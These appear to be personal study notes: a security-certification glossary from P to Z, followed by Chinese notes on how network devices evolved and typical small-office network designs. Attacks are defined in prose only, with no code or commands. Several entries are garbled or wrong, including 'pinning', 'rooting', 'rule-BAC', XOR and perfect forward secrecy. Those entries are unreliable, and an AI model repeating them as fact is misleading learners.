- P12—PKCS#12. A common format for PKI certificates. They are CER-based (binary) and often hold certificates with the private key. They are commonly encrypted.
- PaaS—Platform as a Service. A cloud computing model that provides cloud customers with a preconfigured computing platform they can use as needed. Compare with IaaS and SaaS.
- PAP—Password Authentication Protocol. An older authentication protocol where passwords or PINs are sent across the network in cleartext. Compare with CHAP and MS-CHAPv2.
- passive reconnaissance—A penetration testing method used to collect information. It typically uses open-source intelligence. Compare with active reconnaissance.
- pass the hash—A password attack that captures and uses the hash of a password. It attempts to log on as the user with the hash and is commonly associated with the Microsoft NTLM protocol.
- password cracker—A tool used to discover passwords.
- patch management—The process used to keep systems up to date with current patches. It typically includes evaluating and testing patches before deploying them.
- PBKDF2—Password-Based Key Derivation Function 2. A key stretching technique that adds additional bits to a password as a salt. It helps prevent brute force and rainbow table attacks.
- PEAP—Protected Extensible Authentication Protocol. An extension of EAP sometimes used with 802.1x. PEAP requires a certificate on the 802.1x server.
- PEM—Privacy Enhanced Mail. A common format for PKI certificates. It can use either CER (ASCII) or DER (binary) formats and can be used for almost any type of certificates.
- penetration testing—A method of testing targeted systems to determine if vulnerabilities can be exploited. Penetration tests are intrusive. Compare with vulnerability scanner.
- perfect forward secrecy—A characteristic of encryption keys ensuring that keys are random. Perfect forward secrecy methods do not use deterministic algorithms.
- permanent agent—A NAC agent that is installed on a client. It checks the client for health. Compare with dissolvable agent. - permission auditing review—An audit that analyzes user privileges. It identifies the privileges (rights and permissions) granted to users, and compares them against what the users need.
- PFX—Personal Information Exchange. A common format for PKI certificates. It is the predecessor to P12 certificates.
- Pharming — obtain personal information by domain spoofing, 'poisons' a DNS server, infuse false information into the DNS server, resulting in a user's request being redirected elsewhere.
- PHI—Personal Health Information. PII that includes health information.
- phishing—The practice of sending email to users with the purpose of tricking them into revealing personal information or clicking on a link.
- physical controls—Security controls that you can physically touch.
- PII—Personally Identifiable Information. Information about individuals that can be used to trace a person’s identity, such as a full name, birth date, biometric data, and more.
- ping—A command-line tool used to test connectivity with remote systems.
- pinning—A security mechanism used by some web s rsonation. Web sites provide clients with a list of public key hashes. Clients store the list and use it to validate the web site.
  - Public key pinning: provides clients with a list of public key hashes (a list of public key hashes in HTTPS responses from the web server) that clients can use to detect web site impersonation attempts. helps validate certificates.
  - HTTP Public Key Pinning (HPKP):
  - Online Certificate Status Protocol (OCSP) stapling: reduces OCSP traffic sent to a Certificate Authority (CA). reduces Online Certificate Status Protocol (OCSP) traffic by appending a timestamped, digitally signed OCSP response to a certificate.
  - Perfect forward secrecy: ensures that the compromise of a long-term 83
     that allows HTTPS websites to resist impersonation by
attackers using fraudulent certificates. key does not compromise keys used in the past.
  - Key stretching techniques: add additional bits (salts) to passwords.
- PIV—Personal Identity Verification card. A specialized type of smart card used by U.S. federal agencies. It includes photo
identification and provides confidentiality, integrity, authentication, and non-repudiation.
- Pivot 枢轴—One of the steps in penetration testing.
  - After escalating privileges, the tester uses additional tools to
gain additional information on the exploited computer or on
the network.
  - The process of accessing other systems through a single compromised system.
- plaintext—Text displayed in a readable format. Encryption converts plaintext to ciphertext.
- pointer dereference—A programming practice that uses a pointer to reference a memory area.
  - A failed dereference operation can corrupt memory and sometimes even cause an application to crash.
- POP3—Post Office Protocol version 3: protocol used to transfer email from mail servers to clients.
- port mirror—A monitoring port on a switch. All traffic going through the switch is also sent to the port mirror.
- preventive controls—Security controls that attempt to prevent a security incident from occurring.
- privacy impact assessment—An assessment used to identify and reduce risks related to potential loss of PII. Compare with privacy threshold assessment.
- privacy threshold assessment—An assessment used to help identify if a system is processing PII. Compare with privacy impact assessment.
- private data—Information about an individual that should remain private.
  - Examples: Personally Identifiable Information (PII) and 84

Personal Health Information (PHI)
- private key—Part of a matched key pair used in asymmetric encryption. The private key always stays private. Compare with public key.
- privilege escalation—The process of gaining elevated rights and permissions. Malware typically uses a variety of techniques to gain elevated privileges.
- privileged account—An account with elevated privileges, such as an administrator account.
- proprietary data—Data that is related to ownership. Common examples are information related to patents or trade secrets.
- protocol analyzer—A tool used to capture network traffic. Both professionals and attackers use protocol analyzers to examine
packets. A protocol analyzer can be used to view data sent in clear text.
- proximity cards—Small credit card-sized cards that activate when they are in close proximity to a card reader. They are often used by authorized personnel to open doors.
- proxy/proxies—A server (or servers) used to forward requests for services such as HTTP or HTTPS. A forward proxy server
forwards requests from internal clients to external servers. A reverse proxy accepts requests from the Internet and forwards them to an internal web server. A transparent proxy does not modify requests, but nontransparent proxies include URL filters. An application proxy is used for a specific application, but most proxy servers are used for multiple protocols.
- PSK—Pre-shared key. A wireless mode that uses a pre-shared key (similar to a passwordor passphrase) for security. Compare with Enterprise and Open modes.
- public data—Data that is available to anyone. It might be in brochures, in press releases, or on web sites.
- public key—Part of a matched key pair used in asymmetric encryption. The public key is publicly available. Compare with
       private key.
- Public Key Infrastructure (PKI)—A group of technologies used to
request, create, manage, store, distribute, and revoke digital certificates.
- pulping—A process that is performed after shredding papers. It reduces the shredded paper to a mash or puree.
- pulverizing—A process used to physically destroy items such as optical discs that aren’t erased by a degausser.
- purging—A general sanitization term indicating that all sensitive data has been removed from a device.
- push notification services—The services that send messages to mobile devices.
◆Q
- qualitative risk assessment—A risk assessment that uses judgment to categorize risks. It is based on impact and likelihood of occurrence.
- quantitative risk assessment—A risk assessment that uses specific monetary amounts to identify cost and asset value. It then uses the SLE and ARO to calculate the ALE.
◆R
- race condition—A programming flaw that occurs when two sets of code attempt to access the same resource. The first one to access the resource wins, which can result in inconsistent results.
- RADIUS—Remote Authentication Dial-In User Service. An authentication service that provides central authentication for remote access clients. Alternatives are TACACS+ and Diameter.
- RAID—Redundant array of inexpensive disks. Multiple disks added together to increase performance or provide protection against faults. Common types include RAID-1, RAID-5, RAID-6, and RAID-10.
- rainbow table—A file containing precomputed hashes for character
combinations. Rainbow tables are used to discover passwords. PBKDF2 and bcrypt thwart rainbow table attacks.
- ransomware—A type of malware used to extort money from individuals and organizations. Ransomware typically encrypts the user’s data and demands a ransom before decrypting the data.
- RAT—Remote access Trojan. Malware that allows an attacker to take control of a system from a remote location.
- RC4—A symmetric stream cipher that can use between 40 and 2,048 bits. Experts consider it cracked and recommend using stronger alternatives.
- record time offset—An offset used by recorders to identify times on recordings. If you know when the recording started, you can use the offset to identify the actual time at any point in the recording.
- recovery site—An alternate location for business functions after a major disaster.
- redundancy—The process of adding duplication to critical system components and networks to provide fault tolerance.
- refactoring—A driver manipulation method. Developers rewrite the code without changing the driver’s behavior.
- remote wipe—The process of sending a signal to a remote device to erase all data. It is useful when a mobile device is lost or stolen.
- replay attack—An attack where the data is captured and replayed. Attackers typically modify data before replaying it.
- resource exhaustion—The malicious result of many DoS and DDoS attacks. The attack overloads a computer’s resources (such as the processor and memory), resulting in service interruption.
- retina scanners—Biometric systems that scan the retina of an eye for authentication.
- RFID attacks—Attacks against radio-frequency identification (RFID) systems. Some common RFID attacks are eavesdropping, replay, and DoS.
- RIPEMD—RACE Integrity Primitives Evaluation Message Digest.
A hash function used for integrity. It creates fixed-length hashes of 128, 160, 256, or 320 bits.
- risk—The possibility or likelihood of a threat exploiting a vulnerability resulting in a loss. Compare with threat and vulnerability.
- risk assessment—A process used to identify and prioritize risks. It includes quantitative risk assessments and qualitative risk assessments.
- risk management—The practice of identifying, monitoring, and limiting risks to a manageable level. It includes risk response techniques, qualitative risk assessments, and quantitative risk assessments.
- risk mitigation—The process of reducing risk by implementing controls. Security controls reduce risk by reducing vulnerabilities associated with a risk, or by reducing the impact of a threat.
- risk register—A document listing information about risks. It typically includes risk scores along with recommended security controls to reduce the risk scores.
- risk response techniques—Methods used to manage risks. Common risk response techniques are accept, transfer, avoid, and mitigate.
- rogue AP—An unauthorized AP. It can be placed by an attacker or an employee who hasn’t obtained permission to do so.
- role-BAC—Role-based access control. An access control model that uses roles based on jobs and functions to define access. It is often implemented with groups (providing group-based privileges).
- root certificate—A PKI certificate identifying a root CA.
- rooting—The process of modifying an Android device, giving the user root- level, or administrator, access. Compare with jailbreaking. computer. Rootkits are often able to hide themselves from users and antivirus software.
- ROT13—A substitution cipher that uses a key of 13. To encrypt a message, you would rotate each letter 13 spaces. To decrypt a message, you would rotate each letter 13 spaces.
- round-robin—A scheduling method used with load balancers. It redirects each client request to servers in a predetermined order.
- router—A network device that connects multiple network segments together into a single network. They route traffic based
on the destination IP address and do not pass broadcast traffic. Routers use ACLs.
- RPO—Recovery point objective. A term that refers to the amount of data you can afford to lose by identifying a point in time where data loss is acceptable. It is often identified in a BIA.
- RSA—Rivest, Shamir, and Adleman. An asymmetric algorithm used to encrypt data and digitally sign transmissions. It is named after its creators,
- Rivest, Shamir, and Adleman.
- RSTP—Rapid Spanning Tree Protocol. An improvement of STP to prevent switching loop problems.
- RTO—Recovery time objective. The maximum amount of time it should take to restore a system after an outage. It is derived from the maximum allowable outage time identified in the BIA.
- RTOS—Real-time operating system. An operating system that reacts to input within a specific time. Many embedded systems include an RTOS.
- rule-BAC—Rule-based access control. An access control model that uses rules to define access. Rule- based access control is based on a set of approved instructions, such as an access control list, or rules that trigger in response to an event, such as modifying ACLs after detecting an attack. Compare with compiled code.
◆
◆S
- SaaS—Software as a Service. A cloud computing model that provides applications over the Internet. Webmail is an example of a cloud-based technology. Compare with IaaS and PaaS.
- salt—A random set of data added to a password when creating the hash. PBKDF2 and bcrypt are two protocols that use salts.
- SAML—Security Assertion Markup Language. An XML-based standard used to exchange authentication and authorization
information between different parties. SAML provides SSO for web- based applications.
- sandboxing—The use of an isolated area on a system, typically for testing. Virtual machines are often used to test patches in an
isolated sandbox. Application developers sometimes use the chroot command to change the root directory creating a sandbox.
- sanitize—The process of destroying or removing all sensitive data from systems and devices. Data sanitization methods include
burning, shredding, pulping, pulverizing, degaussing, purging, and wiping.
- SATCOM—Satellite communications. A communication system that allows devices to connect to a satellite for communications. Many cars include satellite communication capabilities.
- SCADA—Supervisory control and data acquisition. A system used to control an ICS such as a power plant or water treatment facility. Ideally, a SCADA is within an isolated network.
- screen filter—A physical security device used to reduce visibility of a computer screen. Screen filters help prevent shoulder surfing.
- script kiddie—An attacker with little expertise or sophistication. Script kiddies use existing scripts to launch attacks. - Scrubbing center: the scrubbing centers ara centralized data cleaning station wherein the traffic to a website is analysed and the malicious traffic is removed.
- SDN—Software defined network. A method of using software and virtualization technologies to replace hardware routers. SDNs separate the data
◆
- and control planes.
- secure boot—A process that checks and validates system files during the boot process. A TPM typically uses a secure boot process.
- secure DevOps—A software development process using an agile- aligned methodology. It considers security through the lifetime of the project.
- security incident—An adverse event or series of events that can negatively affect the confidentiality, integrity, or availability of an organization’s information technology (IT) systems and data.
- SED—Self-encrypting drive. A drive that includes the hardware and software necessary to encrypt a hard drive. Users typically enter credentials to decrypt and use the drive.
- separation of duties—A security principle that prevents any single person or entity from controlling all the functions of a critical or sensitive process. It’s designed to prevent fraud, theft, and errors.
- - - ◆
- service account—An account used by a service or application.
- session hijacking—An attack that attempts to impersonate a user by capturing and using a session ID. Session IDs are stored in cookies. - SFTP—Secure File Transfer Protocol. An extension of Secure Shell (SSH) used to encrypt FTP traffic. SFTP transmits data using TCP port 22.
- SHA—Secure Hash Algorithm. A hashing function used to provide integrity. Versions include SHA-1, SHA-2, and SHA-3.
- Shibboleth—An open source federated identity solution.
- shimming—A driver manipulation method. It uses additional code to modify the behavior of a driver.
- shoulder surfing—The practice of looking over someone’s shoulder to obtain information, such as on a computer screen. A
screen filter placed over a monitor helps reduce the success of shoulder surfing.
- shredding—A method of destroying data or sanitizing media. Cross-cut paper shredders cut papers into fine particles. File
shredders remove all remnants of a file by overwriting the contents multiple times.
- sideloading—The process of copying an application package to a mobile device. It is useful for developers when testing apps, but can be risky if users sideload unauthorized apps to their device.
- SIEM—Security information and event management. A security system that attempts to look at security events throughout the organization.
- signature-based—A type of monitoring used on intrusion detection and intrusion prevention systems. It detects attacks based on known attack patterns documented as attack signatures.
- single point of failure—A component within a system that can cause the entire system to fail if the component fails.
- SLA—Service level agreement. An agreement between a company and a vendor that stipulates performance expectations, such as minimum uptime and maximum downtime levels.
- SLE—Single loss expectancy. The monetary value of any single loss. It is used ◆
- to measure risk with ALE and ARO in a quantitative risk assessment. The calculation is SLE × ARO = ALE.
- smart card—A credit card-sized card that has an embedded microchip and a certificate. It is used for authentication in the something you have factor of authentication.
- S/MIME—Secure/MultipurposeInternetMailExtensions.A popular standard used to secure email. S/ MIME provides confidentiality, integrity, authentication, and non-repudiation.
- SMS—Short Message Service. A basic text messaging service. Compare with
- MMS.
- snapshot—A copy of a virtual machine (VM) at a moment in time. If you later have problems with the VM, you can revert it to the
state it was in when you took the snapshot. Some backup programs also use snapshots to create a copy of data at a moment in time.
- - - ◆
- SNMPv3—Simple Network Management Protocol version 3. A protocol used to monitor and manage network devices such as routers and switches.
- SoC—System on a chip. An integrated circuit that includes a computing system within the hardware. Many mobile devices include an SoC.
- social engineering—The practice of using social tactics to gain information. Social engineers attempt to gain information from people, or get people to do things they wouldn’t normally do.
- something you are—An authentication factor using biometrics, such as a fingerprint scanner. - something you do—An authentication factor indicating action, such as gestures on a touch screen.
- something you have—An authentication factor using something physical, such as a smart card or token.
- something you know—An authentication factor indicating knowledge, such as a password or PIN.
- somewhere you are—An authentication factor indicating location, often using geolocation technologies.
- spam—Unwanted or unsolicited email. Attackers often launch attacks using spam.
- spam filter—A method of blocking unwanted email. By blocking email, it often blocks malware.
- spear phishing—A targeted form of phishing. Spear phishing attacks attempt to target specific groups of users, such as those within a specific organization, or even a single user.
- split tunnel—An encrypted connection used with VPNs. A split tunnel only encrypts traffic going to private IP addresses used in the private network.
- Compare with full tunnel.
- spyware—Software installed on users’ systems without their awareness or consent. Its purpose is often to monitor the user’s computer and the user’s activity.
◆
- SRTP—Secure Real-time Transport Protocol. A protocol used to encrypt and provide authentication for Real-time Transport Protocol (RTP) traffic. RTP is used for audio/video streaming.
- SSH—Secure Shell. A protocol used to encrypt network traffic. SSH encrypts a wide variety of traffic such as SFTP. SSH uses TCP port 22.
- SSID—Service set identifier. The name of a wireless network. SSIDs can be set to broadcast so users can easily see it. Disabling SSID broadcast hides it from casual users. - SSL—Secure Sockets Layer. The predecessor to TLS. SSL is used to encrypt data-in-transit with the use of certificates.
- SSL decryptors—Devices used to create separate SSL (or TLS) sessions. They allow other security devices to examine encrypted traffic sent to and from the Internet.
- SSL/TLS accelerators—Devices used to handle TLS traffic. Servers can off- load TLS traffic to improve performance.
- - - ◆
- SSO—Single sign-on. An authentication method where users can access multiple resources on a network using a single account. SSO can provide central authentication.
- standard operating procedures (SOPs)—A document that provides step-by- step instructions on how to perform common tasks or routine operations.
- stapling—The process of appending a digitally signed OCSP response to a certificate. It reduces the overall OCSP traffic sent to a CA.
- STARTTLS—A command (not an acronym) used to upgrade an unencrypted connection to an encrypted connection on the same port.
- steganography—The practice of hiding data within data. example, it’s possible to embed text files within an image, hiding them from casual users. It is one way to obscure data to hide it.
- storage segmentation—A method used to isolate data on mobile devices. It allows personal data to be stored in one location and encrypted corporate data to be stored elsewhere.
- stored procedures—A group of SQL statements that execute as a whole, similar to a mini-program. Developers use stored procedures to prevent SQL injection attacks. - STP—Spanning Tree Protocol. A protocol enabled on most switches that protects against switching loops. A switching loop can be caused if two ports of a switch are connected.
- stream cipher—An encryption method that encrypts data as a stream of bits or bytes. Compare with
- block cipher.
- substitution cipher—An encryption method that replaces characters with other characters.
- supply chain assessment—An evaluation of the supply chain needed to produce and sell a product. It includes raw materials and
all the processes required to create and distribute a finished product.
- switch—A network device used to connect devices. Layer 2 switches send
◆
- traffic to ports based on their MAC addresses. Layer 3 switches send traffic to ports based on their IP addresses and support VLANs.
- symmetric encryption—A type of encryption using a single key to encrypt and decrypt data. Compare with asymmetric encryption.
- system sprawl—A vulnerability that occurs when an organization has more systems than it needs, and systems it owns are underutilized. Compare with VM sprawl.
 - - ◆
◆
◆T
 - tabletop exercise—A discussion-based exercise where participants talk through an event while sitting at a table or in a conference room. It is often used to test business continuity plans.  - TACACS+—TerminalAccessControllerAccess-ControlSystem Plus. An authentication service that provides central authentication
for remote access clients. It can be used as an alternative to RADIUS.
 ⁃
- tailgating—A social engineering attack where one person follows behind another person without using credentials. Mantraps help prevent tailgating.
- taps—Monitoring ports on a network device. IDSs use taps to capture traffic.
- tcpdump—Acommand-lineprotocolanalyzer.Administratorsuse it to capture packets.
- technical controls—Security controls implemented through technology.
- tethering—The process of sharing an Internet connection from one mobile device to another.
- thin AP/ controller-based AP—An AP that is managed by a controller. Compare with fat AP.
      - third-party app store—An app store other than the primary source for mobile device apps.
  - It refers to an app store other than the App Store or Google Play for Apple and Android devices, respectively.
- threat—Any circumstance or event that has the potential to compromise confidentiality, integrity, or availability. Compare with risk and vulnerability.
- threat assessment—An evaluation of potential threats. Some common types of threat assessments are environmental, manmade, internal, and external.
- three-way handshake: a method used by TCP to create TCP/IP connection over an internet protocol based network, between a local host/client and server.
  - It requires both the client and server to exchange, SYN, /SYN-ACK, ACK (acknowledgment), packets before actual data communication begins.
⁃
- time-of-day restrictions—An account restriction that prevents users from logging on at certain times.
- TKIP—Temporal Key Integrity Protocol. A legacy wireless security protocol.
       - TKIP: older encryption protocol used with WPA. Upgrade of WEP.
  - CCMP: newer encryption protocol used with WPA2. (recommended
replacement)
- TLS—Transport Layer Security. The replacement for SSL. TLS is
used to encrypt data-in-transit. Like SSL, it uses certificates issued by CAs.
- token—An authentication device or file. A hardware token is a physical device used in the something you have factor of authentication. A software token is a small file used by authentication services indicating a user has logged on.
- TOTP—Time-based One-Time Password. An open source standard similar to HOTP. It uses a timestamp instead of a counter. One- time passwords created with TOTP expire after 30 seconds.
- TPM—Trusted Platform Module. A hardware chip on the motherboard included with many laptops and some mobile devices. It provides full disk encryption. Compare with HSM.
- Tracert—A command-line tool used to trace the route between two systems.
- Traceroute—network diagnostic commands for displaying the route (path) and measuring transit delays of packets across an
Internet Protocol (IP) network. small TTL values are transmitted through packets via traceroute. Help identify the connection stops or get broken, whether it is firiewall, ISP, router etc.
- transitive trust—An indirect trust relationship created by two or more direct trust relationships.
- Trojan—Malware also known as a Trojan horse. A Trojan often looks useful, but is malicious.
- trusted operating system—An operating system that is configured to meet a set of security requirements. It ensures that only authorized personnel can access data based on their permissions.
- Twofish—A symmetric key block cipher. It encrypts data in 128- bit blocks and supports 128-, 192-, or 256-bit keys. Compare with Blowfish. - Type I hypervisors—A virtualization technology. Type I hypervisors (or bare- metal hypervisors) run directly on the system hardware. They don’t need to run within an operating system.
- Type II hypervisors—A virtualization technology. Type II hypervisors run as software within a host operating system. The
Microsoft Hyper-V hypervisor runs within a Microsoft operating system to host VMs.
- Typo squatting—The purchase of a domain name that is close to a legitimate domain name. Attackers often try to trick users who
inadvertently use the wrong domain name. Also called URL hijacking.
◆U
- UAVs—Unmanned aerial vehicles. Flying vehicles piloted by remote control or onboard computers.
- UEFI—Unified Extensible Firmware Interface. A method used to boot some systems and intended to replace Basic Input/Output System (BIOS) firmware.
- URL hijacking—The purchase of a domain name that is close to a legitimate domain name. Attackers often try to trick users who
inadvertently use the wrong domain name. Also called typo squatting.
- USB OTG—Universal Serial Bus On-The-Go. A cable used to connect mobile devices to other devices. It is one of many methods that you can use to connect a mobile device to external media.
- use case—A methodology used in system analysis and software engineering to identify and clarify requirements to achieve a goal.
example, a use case of supporting confidentiality can help an organization identify the steps required to protect the confidentiality of data.
- UTM—Unified threat management. A group of security controls combined in a single solution. UTM appliances can inspect data streams for malicious content and block it. V
- VDI/VDE—virtual desktop infrastructure / environment. Users access a server hosting virtual desktops and run the desktop operating system from the server.
- vendor diversity—The practice of implementing security controls from different vendors to increase security. Compare with control diversity.
- version control—A method of tracking changes to software as it is updated.
- virtualization—A technology that allows you to host multiple virtual machines on a single physical system. Different types include Type I, Type II, and application cell/container virtualization.
- virus—Malicious code that attaches itself to a host application. The host application must be executed to run, and the malicious code executes when the host application is executed.
- VLAN—Virtual local area network. A method of segmenting traffic. A VLAN logically groups different computers together without regard to their physical location.
- VM escape—An attack that allows an attacker to access the host system from within a virtual machine. The primary protection is to keep hosts and guests up to date with current patches.
- VM sprawl 蔓延—A vulnerability that occurs when an organization has many VMs that aren’t properly managed. Unmanaged VMs are not kept up to date with current patches. Compare with system sprawl.
- Voice recognition—A biometric method that identifies who is speaking using speech recognition methods to identify different acoustic features.
- VPN—Virtual private network. A method that provides access to a private network over a public network such as the Internet.
  - VPN concentrators: dedicated devices used to provide VPN 101

access to large groups of users.
- Vulnerability—A weakness. It can be a weakness in the hardware,
the software, the configuration, or even the users operating the system.
  - threat—Any circumstance or event that has the potential to compromise confidentiality, integrity, or availability.
  - risk—The possibility or likelihood of a threat exploiting a vulnerability resulting in a loss.
- Vulnerability scanner—A tool used to detect vulnerabilities. A scan typically identifies vulnerabilities, misconfigurations, and a lack of security controls. It passively tests security controls.


## W
- warm site—An alternate location for operations. A compromise between an expensive hot site and a cold site. Compare with cold site and hot site.
- waterfall—A software development life cycle model using a top- down approach.
  - It uses multiple stages with each stage starting after the previous stage is complete.
  - Compare with agile.
- watering hole attack—An attack method that infects web sites that
a group is likely to trust and visit.
- wearable technology—Smart devices that a person can wear or
have implanted.
- web application firewall (WAF)—A firewall specifically designed
to protect a web application, such as a web server. A WAF inspects the contents of traffic to a web server and can detect malicious content, such as code used in a cross-scripting attack, and block it.
- WEP—
  - Wired Equivalent Privacy
         - Wireless Encryption Protocol. initialization vectors are relatively small and, for the most part, get reused pretty frequently.
- whaling—A form of spear phishing that attempts to target high- level executives. When successful, attackers gain confidential
company information that they might not be able to get anywhere else.
- white box test—A type of penetration test. Testers have full knowledge of the environment prior to starting the test. Compare with black box test and gray box test.
- Wi-Fi Direct—A standard that allows devices to connect without a wireless access point.
- wildcard certificate—A certificate that can be used for multiple domains with the same root domain. It starts with an asterisk.
- wiping—The process of completely removing all remnants of data on a disk. A bit-level overwrite writes patterns of 1s and 0s multiple times to ensure data on a disk is unreadable.
- wireless scanners—A network scanner that scans wireless frequency bands. Scanners can help discover rogue APs and crack passwords used by wireless APs.
- worm—Self-replicating malware that travels through a network. Worms do not need user interaction to execute.
- WPA—Wi-Fi Protected Access. A legacy wireless security protocol. It has been superseded by WPA2.
- WPA2—Wi-Fi Protected Access II. A wireless security protocol.
  - It supports CCMP for encryption, which is based on AES.
  - It can use Open mode, a pre- shared key, or Enterprise mode.
- WPS—Wi-Fi Protected Setup. A method that allows users to easily configure a wireless network, often by using only a PIN. WPS brute force attacks can discover the PIN.
- WPS attack—An attack against an AP. A WPS attack discovers the eight-digit WPS PIN and uses it to discover the AP passphrase.
   X
- XML—Extensible Markup Language. A language used by many databases for inputting or exporting data. XML uses formatting rules to describe the data.
- XOR—A logical operation used in some encryption schemes.
  - XOR operations compare two inputs (^). If the two inputs are
the same, it outputs True(0). If the two inputs are different, it
outputs False(1).
  - 1 xor 0 = 0 xor 1 = 1
  - 1 xor 1 = 0 xor 0 = 0
- Cross-Site Scripting (XSS) attacks. type of injection, in which malicious scripts are injected into otherwise benign and trusted websites.
  - XSS attacks occur when an attacker uses a web application to send malicious code, generally in the form of a browser side script, to a different end user.
Z
- zero-day vulnerability—A vulnerability or bug that is unknown to trusted sources but can be exploited by attackers.
  - Zero-day attacks take advantage of zero-day vulnerabilities.
   assignement
只要网络硬件可以集中式软件管理，可编程化，控制转发层面分开，则可以认为这个网络 是一个SDN网络。
1. 网络诞生之前:pc 单机运行，没有网卡，网线，协议饯，数据通过软盘，光盘... 2. 网络通信三要素:【IP地址+端口号+传输协议】三要素，是网络中通信必不可少
的⻆色。
  - IP地址即确定和哪台主机通信
  - 端口分为物理端口和逻辑端口，物理端口主要死网卡口(路由器、交换机
 等)，逻辑端口是指确定进程(应用程序)   - 传输协议指的是两种，TCP/UDP
3. 网络组成三要素:[网线+网卡+协议栈] 最小单元网络
  - 网线:物理介质，承载比特流/电信号(类似电话线承载语音流/模拟信
号)
  - 网卡:数据处理，例如将电脑磁盘的数据 / 字节转换为网线上的电流 / 比
特，将比特流转换为数据
  - 协议栈:沟通语言，实现通信过程中的数据解析、地址寻址、流控制等
 ⁃
  - 缺点:网线不够⻓:但是当距离超过网线物理传输距离上限，数据则开始 丢失。
 ⁃
4. 中继器 repeater 出现:物理层产品，对信息进行中继和放大，实现设备远距离传 输。  ⁃
  - 缺点:中继口不够:一般中继器只有两个接口，如果超过三个主机，则无法 实现多主机直接的数据通信。
⁃
5. 集线器 hub 来了:hub是一种“多口中继器”，物理层产品，对信息进行中继和放 大，从任一个接收到的数据，可以往其他所有接口泛洪。
  ⁃
  - 缺点:集线器不能识别数据包的寻址信息和上层内容，无法对终端主机隔
离，多个主机出于冲突域中，导致带乱利用率低
6. 怕骚扰，网桥 bridge 来了:链路层产品，记录终端主机MAC地址，生成MAC
表，根据MAC表转发主机之间的数据流。
  - 网桥能冲突域隔离，提高网络带宽利用率，不同接口间的数据不会互相冲
突。
 ⁃
  - 缺点:接口有限，默认是两个接口，对网络的隔离冲突有限，无专用硬件 处理数据而是采用 CPU 导致处理速度稍慢
7. 不够快，交换机 switch 来了:链路层产品，记录终端主机MAC地址并生成MAC 表(CAM表)，根据MAC表转发主机之间的数据流。
  - 交换机在网桥基础上升级和延伸，相比网桥，有以下优点:   - 接口数量更密集，独立冲突域，带宽利用率大大增⻓   - 采用专用 ASIC 硬件芯片进行高速转发
  - 能够进行 VLAN 隔离(不仅仅可以隔离冲突域，而且可以通过
VLAN 隔离广播域)
 ⁃
  - 缺点:是局域网产品，适用于本地网络，无法实现远程广域网通信。 8. 不够远，路由器来了:网络层产品，基于IP寻址，采用路由表实现数据转发
  - 路由器主要用于连接不同局域网(可以是不同介质，即令牌网和以太网互 通)，实现广播域隔离，也可以用于远程通信(广域网连接)
  - 是物联网大爆发的主要原因，使跨介质夸地理的网络大融合成为现实
  - IP逻辑协议寻址机制是实现不同类型局域网连通的关键，不同局域网主机 只要有配置IP地址，有合理网段规划，则可以通信，路由器在实现局域网
之间通信时，会实现”介质翻转“和”路由转发“。
  - 第一台路由器，斯坦福大学，用于大学校园网络 SUNet。
   -  ⁃
9. 布线麻烦，无线AC/AP(Access point)来了:可以看成带有无线功能的交换机/
路由器，能将有线信号转换成无线的设备都可以叫无线AP。指802.11协议的无 线AP，即大家耳熟能详的WIFI。
  - 根据部署方式不同，分为胖 AP 和瘦 AP。
  - AC(Wireless Access Point Controller)统一管理的就是瘦AP，
  - 瘦 AP 中，无线 AP 仅具备无线信号发射的功能，所有命令调 试全部集中在后台的 AC/ 无线控制器中。
  - 其余都是胖 AP。
  - 胖 AP 方案中，无线 AP 有独立的操作系统，独立调试无线热
点所有配置。
  - 小型无线网络(家用、小型企业)采用胖 AP，大型无线网络 (无线
城市、无线校园网) 采用瘦 AP 方案(AP+AC)
   -  ⁃
10. 不够安全，防火墙(Firewall)来了:网络安全产品，对于网络进行安全访问限
制，一般用于互联网边缘防黑客攻击
  - 根据防火墙的技术特征，分为:包过滤、应用代理、状态检测防火墙。
  - 根据产品形态:软件和硬件防火墙。
  - 路由器侧重地址翻转和路由策略，防火墙侧重安全隔离
  - 防火墙类似有安全功能的路由器，早起 firewalls 就是在路由器 + 访问控制功
能，多亿防火墙的很多功能可以在 router 上看到，比如路由协议，访问控 制列表，地址翻转技术等。
  - But we need both rouetr and firewalls: 网络边界的router可以替代成 firewalls，但是在网络里可以同时存在，router侧重地址翻转和路由 策略，firewalls侧重安全隔离等。
  - 在firewall基础上:后面又延伸出了web防火墙，安全网关，入侵检 测防御等产品
  - 一般中小型单位 互联网出口使用防火墙或者只使用路由器，功能多且便宜
  - 特定行业内网出口 必须用路由器，政策要求和业务需要，如公安 / 法院 /
金融等
  - 大型网络防火墙和路由器分开，如果都用防火墙，性能可能扛不住
  - 路由器和防火墙两者都存在的情况下，一般都是路由器在最外层，防火墙
一般会旁挂服务器，即 DMZ 区域，采用第一种架构，服务器在私网 IP 域，相对安全。黑客攻击首先需要穿透路由器的 NAT，还需绕过防火墙的 检测。  ⁃
11. 网络拥挤，流量控制来了:产品主要分为上网行为管理，负载均衡器/应用交付， 链路优化等，
  - 行为管理:主要针对流量进行精细化区分控制
 ⁃
  - 负载均衡器/应用交付:侧重流量的负载均衡(根据流量的特征、应用、地
址等进行区分，然后分发到不同的链路和server上)
 ⁃
  - 链路优化:主要应用在广域网里低俗路边界，最大利用链路。  ⁃
  - 流控产品是一种七层产品，更多关注流量和应用特征。 一个网络到底需要多少设备?
1. 家庭 SOHO 网络
 ⁃
  - 说明:典型家庭网络，路由器连接外网，无线路由器提供 wifi
  - 设备:无线路由器
  - 技术:WI-FI、NAT(网络地址转换)、PPPOE(以太网上的点对点协议，即
无线路由器拨号协议)、DHCP(动态主机设置协议，用于内部网或网络
服务供应商自动分配 IP 地址) 2. 小型创业公司  ⁃
  - 说明:小型企业架构，两层架构，单核心拓扑
  - 设备:路由器、交换机、服务器
  - 技术:VLAN、TRUNK、DHCP、WLAN、静态路由 /OSPF、PPPOE、
NAT、ACL 等
 ⁃
  - 说明:总部属于中型企业架构，分部属于小型企业架构
  - 设备:
  - 总部:路由器、交换机、防火墙、瘦 AP(无线 AC+AP)、服务器
  - 分布:路由器、交换机   - 技术:
  - 总部:VLAN、MSTP、VRRP、WIFI、NAT、VPN、TRUNK、
DHCP、ACL 等
  - 分部:VLAN、VPN、WIFI
  - 解决思路:
  - 使用子网划分:对每个部⻔进行规划 (各部⻔单独一个 24 位的子
网断，保证连续性，即使后续有新增加的员工，24 位有 254 个地 址，可以保证能正常使用，并且连续性可以方便做汇总、与一些策 略的控制)。
  - 冗余性的实现，可以利用 MSTP+VRRP 技术实现链路的冗余性与网 关的热备功能，并且核心之间链路起链路聚合，提高带宽。
